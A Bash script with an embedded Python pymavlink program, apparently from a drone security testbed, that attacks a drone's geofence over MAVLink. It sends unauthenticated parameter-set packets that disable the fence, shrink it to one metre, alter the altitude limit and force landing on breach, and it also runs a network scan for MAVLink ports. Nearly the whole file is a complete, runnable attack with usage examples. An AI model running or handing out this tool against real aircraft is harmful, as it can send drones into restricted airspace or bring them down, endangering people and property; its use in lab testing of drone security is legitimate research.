#!/bin/bash
# geofencing_attack.sh - 드론 지오펜스 조작을 통한 비행 제한 우회 공격
# Path: /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/denial_of_service/geofencing_attack.sh
# Purpose: MAVLink 파라미터 조작으로 지오펜스 경계 변경 및 비활성화

source "$(dirname "$0")/../common/colors.sh"
source "$(dirname "$0")/../common/utils.sh"

ATTACK_NAME="Geofencing Attack"

print_attack_banner() {
    echo -e "${CYAN}============================================${NC}"
    echo -e "${CYAN}         Geofencing Attack                ${NC}"
    echo -e "${CYAN}============================================${NC}"
}

execute_geofencing_attack() {
    local target_host=${1:-"127.0.0.1"}
    local target_port=${2:-"5760"}
    local attack_mode=${3:-"disable"}
    local parameter_value=${4:-""}
    
    log_info "Starting geofencing attack"
    log_info "Target: ${target_host}:${target_port}"
    log_info "Attack mode: ${attack_mode}"
    
    # Python 스크립트 생성 및 실행
    create_and_run_geofence_attack "$target_host" "$target_port" "$attack_mode" "$parameter_value"
    local result=$?
    
    if [ $result -eq 0 ]; then
        log_success "Geofencing attack completed successfully"
        return 0
    else
        log_error "Geofencing attack failed"
        return 1
    fi
}

create_and_run_geofence_attack() {
    local target_host="$1"
    local target_port="$2"
    local attack_mode="$3"
    local parameter_value="$4"
    
    log_info "Creating and executing geofence manipulation attack..."
    
    python3 << PYEOF
from pymavlink import mavutil
import sys
import socket
import time

class GeofenceAttacker:
    def __init__(self, target_ip, target_port):
        self.target_ip = target_ip
        self.target_port = int(target_port)
        self.mav = mavutil.mavlink.MAVLink(None)
        self.mav.target_system = 1
        self.mav.target_component = 1
    
    def set_param(self, param_id, param_value, param_type):
        """MAVLink 파라미터 설정 패킷 생성"""
        try:
            return self.mav.param_set_encode(
                target_system=self.mav.target_system,
                target_component=self.mav.target_component,
                param_id=param_id.encode('utf-8'),
                param_value=param_value,
                param_type=param_type
            ).pack(self.mav)
        except Exception as e:
            print(f"[-] Parameter encoding failed: {e}")
            return None
    
    def send_packet_tcp(self, packet_data):
        """TCP를 통한 MAVLink 패킷 전송"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.target_ip, self.target_port))
            sock.send(packet_data)
            sock.close()
            return True
        except Exception as e:
            print(f"[-] TCP send failed: {e}")
            return False
    
    def disable_geofence(self):
        """지오펜스 완전 비활성화"""
        print("[*] Disabling geofence...")
        
        packet = self.set_param('FENCE_ENABLE', 0, mavutil.mavlink.MAV_PARAM_TYPE_UINT8)
        if packet and self.send_packet_tcp(packet):
            print("[+] Geofence disabled - drone can now fly unrestricted")
            return True
        else:
            print("[-] Failed to disable geofence")
            return False
    
    def enable_geofence(self):
        """지오펜스 활성화"""
        print("[*] Enabling geofence...")
        
        packet = self.set_param('FENCE_ENABLE', 1, mavutil.mavlink.MAV_PARAM_TYPE_UINT8)
        if packet and self.send_packet_tcp(packet):
            print("[+] Geofence enabled")
            return True
        else:
            print("[-] Failed to enable geofence")
            return False
    
    def set_fence_radius(self, radius):
        """지오펜스 반경 설정"""
        print(f"[*] Setting fence radius to {radius} meters...")
        
        # 지오펜스 활성화
        enable_packet = self.set_param('FENCE_ENABLE', 1, mavutil.mavlink.MAV_PARAM_TYPE_UINT8)
        if enable_packet:
            self.send_packet_tcp(enable_packet)
            time.sleep(0.5)
        
        # 반경 설정
        radius_packet = self.set_param('FENCE_RADIUS', float(radius), mavutil.mavlink.MAV_PARAM_TYPE_REAL32)
        if radius_packet and self.send_packet_tcp(radius_packet):
            print(f"[+] Geofence radius set to {radius} meters")
            return True
        else:
            print(f"[-] Failed to set fence radius to {radius}")
            return False
    
    def set_fence_alt_max(self, altitude):
        """지오펜스 최대 고도 설정"""
        print(f"[*] Setting fence maximum altitude to {altitude} meters...")
        
        # 지오펜스 활성화
        enable_packet = self.set_param('FENCE_ENABLE', 1, mavutil.mavlink.MAV_PARAM_TYPE_UINT8)
        if enable_packet:
            self.send_packet_tcp(enable_packet)
            time.sleep(0.5)
        
        # 최대 고도 설정
        alt_packet = self.set_param('FENCE_ALT_MAX', float(altitude), mavutil.mavlink.MAV_PARAM_TYPE_REAL32)
        if alt_packet and self.send_packet_tcp(alt_packet):
            print(f"[+] Geofence maximum altitude set to {altitude} meters")
            return True
        else:
            print(f"[-] Failed to set maximum altitude to {altitude}")
            return False
    
    def set_fence_action(self, action):
        """지오펜스 위반시 동작 설정"""
        actions = {
            0: "None",
            1: "RTL (Return to Launch)",
            2: "Land",
            3: "Brake",
            4: "Guided mode"
        }
        
        action_name = actions.get(int(action), "Unknown")
        print(f"[*] Setting fence breach action to {action} ({action_name})...")
        
        # 지오펜스 활성화
        enable_packet = self.set_param('FENCE_ENABLE', 1, mavutil.mavlink.MAV_PARAM_TYPE_UINT8)
        if enable_packet:
            self.send_packet_tcp(enable_packet)
            time.sleep(0.5)
        
        # 액션 설정
        action_packet = self.set_param('FENCE_ACTION', int(action), mavutil.mavlink.MAV_PARAM_TYPE_UINT8)
        if action_packet and self.send_packet_tcp(action_packet):
            print(f"[+] Geofence breach action set to {action} ({action_name})")
            return True
        else:
            print(f"[-] Failed to set fence action to {action}")
            return False
    
    def malicious_fence_setup(self):
        """악의적인 지오펜스 설정 - 극도로 제한적인 경계"""
        print("[*] Setting up malicious geofence parameters...")
        
        # 극도로 작은 반경 (1미터)
        if not self.set_fence_radius(1):
            return False
        
        time.sleep(0.5)
        
        # 극도로 낮은 최대 고도 (2미터)
        if not self.set_fence_alt_max(2):
            return False
        
        time.sleep(0.5)
        
        # 즉시 착륙하도록 설정
        if not self.set_fence_action(2):
            return False
        
        print("[+] Malicious geofence setup complete - drone severely restricted")
        return True
    
    def comprehensive_attack(self):
        """종합적인 지오펜스 공격"""
        print("[*] Executing comprehensive geofence attack...")
        
        attack_scenarios = [
            ("Disable geofence", self.disable_geofence),
            ("Set malicious radius (1m)", lambda: self.set_fence_radius(1)),
            ("Set dangerous altitude (200m)", lambda: self.set_fence_alt_max(200)),
            ("Force immediate landing", lambda: self.set_fence_action(2)),
            ("Re-enable with restrictions", self.malicious_fence_setup)
        ]
        
        success_count = 0
        for description, attack_func in attack_scenarios:
            print(f"\n[*] {description}...")
            if attack_func():
                success_count += 1
                print(f"[+] {description} - SUCCESS")
            else:
                print(f"[-] {description} - FAILED")
            
            time.sleep(1)
        
        print(f"\n[*] Attack summary: {success_count}/{len(attack_scenarios)} attacks successful")
        return success_count > 0

# 메인 실행 로직
target_ip = "$target_host"
target_port = int("$target_port")
attack_mode = "$attack_mode"
param_value = "$parameter_value"

attacker = GeofenceAttacker(target_ip, target_port)

try:
    if attack_mode == "disable":
        success = attacker.disable_geofence()
    elif attack_mode == "enable":
        success = attacker.enable_geofence()
    elif attack_mode.startswith("set_radius"):
        radius = float(param_value) if param_value else 150
        success = attacker.set_fence_radius(radius)
    elif attack_mode.startswith("set_alt_max"):
        altitude = float(param_value) if param_value else 120
        success = attacker.set_fence_alt_max(altitude)
    elif attack_mode.startswith("set_action"):
        action = int(param_value) if param_value else 1
        success = attacker.set_fence_action(action)
    elif attack_mode == "malicious":
        success = attacker.malicious_fence_setup()
    elif attack_mode == "comprehensive":
        success = attacker.comprehensive_attack()
    else:
        print(f"[-] Unknown attack mode: {attack_mode}")
        success = False
    
    if success:
        print(f"\n[+] Geofence attack completed successfully")
        sys.exit(0)
    else:
        print(f"\n[-] Geofence attack failed")
        sys.exit(1)
        
except Exception as e:
    print(f"[-] Attack execution failed: {e}")
    sys.exit(1)
PYEOF
    
    return $?
}

# MAVLink 타겟 스캔
scan_mavlink_targets() {
    log_info "Scanning for MAVLink targets..."
    
    local common_targets=(
        "127.0.0.1:5760"
        "127.0.0.1:14550"
        "10.13.0.2:5760"
        "10.13.0.3:5760"
        "192.168.1.100:5760"
    )
    
    local found_targets=()
    
    for target in "${common_targets[@]}"; do
        local ip=$(echo "$target" | cut -d':' -f1)
        local port=$(echo "$target" | cut -d':' -f2)
        
        if timeout 2 nc -z "$ip" "$port" 2>/dev/null; then
            found_targets+=("$target")
            echo -e "${GREEN}Found MAVLink service: $target${NC}"
        fi
    done
    
    if [ ${#found_targets[@]} -eq 0 ]; then
        echo -e "${YELLOW}No live MAVLink targets found, using defaults${NC}"
        return 1
    fi
    
    return 0
}

# 메인 실행 함수
main() {
    print_attack_banner
    
    if [ "$EUID" -ne 0 ]; then
        log_error "This script must be run as root"
        exit 1
    fi
    
    # 필수 도구 확인
    local required_tools=("python3")
    local missing_tools=()
    
    for tool in "${required_tools[@]}"; do
        if ! command -v "$tool" >/dev/null 2>&1; then
            missing_tools+=("$tool")
        fi
    done
    
    if [ ${#missing_tools[@]} -gt 0 ]; then
        log_error "Missing required tools: ${missing_tools[*]}"
        exit 1
    fi
    
    # Python 의존성 확인
    if ! python3 -c "import pymavlink" 2>/dev/null; then
        log_info "Installing Python dependencies..."
        pip3 install pymavlink >/dev/null 2>&1
    fi
    
    # 사용자 옵션 처리
    local target_host="${1:-127.0.0.1}"
    local target_port="${2:-5760}"
    local attack_mode="${3:-disable}"
    local parameter_value="${4:-}"
    
    # 사용법 출력
    if [ "$1" = "-h" ] || [ "$1" = "--help" ]; then
        echo "Usage: $0 [target_host] [target_port] [attack_mode] [parameter_value]"
        echo "  target_host     : Target IP address (default: 127.0.0.1)"
        echo "  target_port     : Target MAVLink port (default: 5760)"
        echo "  attack_mode     : Attack type (default: disable)"
        echo "  parameter_value : Value for parametric attacks (optional)"
        echo ""
        echo "Attack modes:"
        echo "  disable         : Disable geofence completely"
        echo "  enable          : Enable geofence"
        echo "  set_radius      : Set fence radius (requires parameter_value)"
        echo "  set_alt_max     : Set maximum altitude (requires parameter_value)"
        echo "  set_action      : Set breach action (requires parameter_value)"
        echo "  malicious       : Set extremely restrictive fence"
        echo "  comprehensive   : Run all attack scenarios"
        echo ""
        echo "Examples:"
        echo "  $0                                    # Disable geofence on localhost"
        echo "  $0 10.13.0.3 5760 disable           # Disable on specific target"
        echo "  $0 127.0.0.1 5760 set_radius 50     # Set 50m radius"
        echo "  $0 127.0.0.1 5760 set_alt_max 10    # Set 10m max altitude"
        echo "  $0 127.0.0.1 5760 set_action 2      # Set action to land"
        echo "  $0 127.0.0.1 5760 malicious         # Malicious restrictive setup"
        echo "  $0 127.0.0.1 5760 comprehensive     # All attacks"
        exit 0
    fi
    
    # 타겟 스캔 (정보용)
    scan_mavlink_targets
    
    # 공격 실행
    execute_geofencing_attack "$target_host" "$target_port" "$attack_mode" "$parameter_value"
    exit $?
}

# 직접 실행 시 메인 함수 호출
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    main "$@"
fi